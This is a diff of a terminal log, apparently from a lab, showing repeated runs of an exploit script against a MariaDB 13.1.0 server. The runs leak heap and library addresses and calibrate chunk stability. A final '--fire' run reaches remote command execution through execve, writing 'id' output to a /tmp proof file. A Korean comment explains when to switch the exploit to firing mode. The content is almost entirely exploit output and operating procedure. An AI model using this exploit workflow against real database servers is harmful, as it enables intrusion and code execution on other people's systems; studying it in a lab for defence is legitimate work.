@@ -115,48 +115,62 @@ $ cat /tmp/frm_pwned_t16
 [bat error]: '/tmp/frm_pwned_t16': No such file or directory (os error 2)
 $ python3 lab_exploit.py
 [*] connected (single arena). server ver: 13.1.0-MariaDB
-[*] MB=0x60b8287d5000 LB=0x7eff60c00000
-[*] leaked C(comment_pos)=0x7eff38022c50
-[*] CALIB: re-leaked C2=0x7eff38022c50  stable=True
+[*] MB=0x5e3caed21000 LB=0x7abd8a000000
+[*] leaked C(comment_pos)=0x7abd64022c50
+[*] CALIB: re-leaked C2=0x7abd64022c50  stable=True
 [=] CALIB PASS. dry-run only. re-run with --fire to arm fieldnr=47 and trigger R5.
 $ python3 lab_exploit.py
 [*] connected (single arena). server ver: 13.1.0-MariaDB
-[*] MB=0x60b8287d5000 LB=0x7eff60c00000
-[*] leaked C(comment_pos)=0x7eff3802d7d0
-[*] CALIB: re-leaked C2=0x7eff3802d7d0  stable=True
+[*] MB=0x5e3caed21000 LB=0x7abd8a000000
+[*] leaked C(comment_pos)=0x7abd6402d7d0
+[*] CALIB: re-leaked C2=0x7abd6402d7d0  stable=True
 [=] CALIB PASS. dry-run only. re-run with --fire to arm fieldnr=47 and trigger R5.
 $ python3 lab_exploit.py
 [*] connected (single arena). server ver: 13.1.0-MariaDB
-[*] MB=0x60b8287d5000 LB=0x7eff60c00000
-[*] leaked C(comment_pos)=0x7eff38038d10
-[*] CALIB: re-leaked C2=0x7eff38038d10  stable=True
+[*] MB=0x5e3caed21000 LB=0x7abd8a000000
+[*] leaked C(comment_pos)=0x7abd64038d10
+[*] CALIB: re-leaked C2=0x7abd64038d10  stable=True
 [=] CALIB PASS. dry-run only. re-run with --fire to arm fieldnr=47 and trigger R5.
 $ python3 lab_exploit.py
 [*] connected (single arena). server ver: 13.1.0-MariaDB
-[*] MB=0x60b8287d5000 LB=0x7eff60c00000
-[*] leaked C(comment_pos)=0x7eff38044fd0
-[*] CALIB: re-leaked C2=0x7eff380474d0  stable=False
+[*] MB=0x5e3caed21000 LB=0x7abd8a000000
+[*] leaked C(comment_pos)=0x7abd64044fd0
+[*] CALIB: re-leaked C2=0x7abd640474d0  stable=False
 [!] chunk NOT stable across deliver (C moved) -> ABORT before firing
-$ python3 lab_exploit.py --fire
+$ python3 lab_exploit.py
 [*] connected (single arena). server ver: 13.1.0-MariaDB
-[*] MB=0x60b8287d5000 LB=0x7eff60c00000
-[*] leaked C(comment_pos)=0x7eff3804b8b0
-[*] CALIB: re-leaked C2=0x7eff3804ddb0  stable=False
+[*] MB=0x5e3caed21000 LB=0x7abd8a000000
+[*] leaked C(comment_pos)=0x7abd6404b8b0
+[*] CALIB: re-leaked C2=0x7abd6404ddb0  stable=False
 [!] chunk NOT stable across deliver (C moved) -> ABORT before firing
+
 # [!!!!!] comment_pos 버퍼가 안정화 되는 구간입니다. 
 # 이전 단계에서의 C가 익스플로잇이 성공한 단계에서의 C와 주소가 같습니다. 
 # 서버가 구성되는 환경마다 틀려질 수 있으므로 --fire 변수를 빼고 실행 시켜 C 주소가 지속적으로 동일하면 --fire 모드로 변경 후 수행하세요 
-$ python3 lab_exploit.py --fire
+
+$ python3 lab_exploit.py
 [*] connected (single arena). server ver: 13.1.0-MariaDB
-[*] MB=0x60b8287d5000 LB=0x7eff60c00000
-[*] leaked C(comment_pos)=0x7eff380517e0
-[*] CALIB: re-leaked C2=0x7eff38051cd0  stable=False
+[*] MB=0x5e3caed21000 LB=0x7abd8a000000
+[*] leaked C(comment_pos)=0x7abd640517e0
+[*] CALIB: re-leaked C2=0x7abd64051cd0  stable=False
 [!] chunk NOT stable across deliver (C moved) -> ABORT before firing
+$ python3 lab_exploit.py
+[*] connected (single arena). server ver: 13.1.0-MariaDB
+[*] MB=0x5e3caed21000 LB=0x7abd8a000000
+[*] leaked C(comment_pos)=0x7abd64051cd0
+[*] CALIB: re-leaked C2=0x7abd64051cd0  stable=True
+[=] CALIB PASS. dry-run only. re-run with --fire to arm fieldnr=47 and trigger R5.
+$ python3 lab_exploit.py
+[*] connected (single arena). server ver: 13.1.0-MariaDB
+[*] MB=0x5e3caed21000 LB=0x7abd8a000000
+[*] leaked C(comment_pos)=0x7abd64051cd0
+[*] CALIB: re-leaked C2=0x7abd64051cd0  stable=True
+[=] CALIB PASS. dry-run only. re-run with --fire to arm fieldnr=47 and trigger R5.
 $ python3 lab_exploit.py --fire
 [*] connected (single arena). server ver: 13.1.0-MariaDB
-[*] MB=0x60b8287d5000 LB=0x7eff60c00000
-[*] leaked C(comment_pos)=0x7eff38051cd0
-[*] CALIB: re-leaked C2=0x7eff38051cd0  stable=True
+[*] MB=0x5e3caed21000 LB=0x7abd8a000000
+[*] leaked C(comment_pos)=0x7abd64051cd0
+[*] CALIB: re-leaked C2=0x7abd64051cd0  stable=True
 [*] arming fieldnr=47, delivering weapon, triggering R5 (execve). cmd='id > /tmp/frm_pwned_t16 2>&1; echo PWNED_$(id -u) >> /tmp/frm_pwned_t16'
 [*] trigger raised (expected on execve): OperationalError(2013, 'Lost connection to MySQL server during query')
 [*] fired. check /tmp/frm_pwned_t16 for proof.
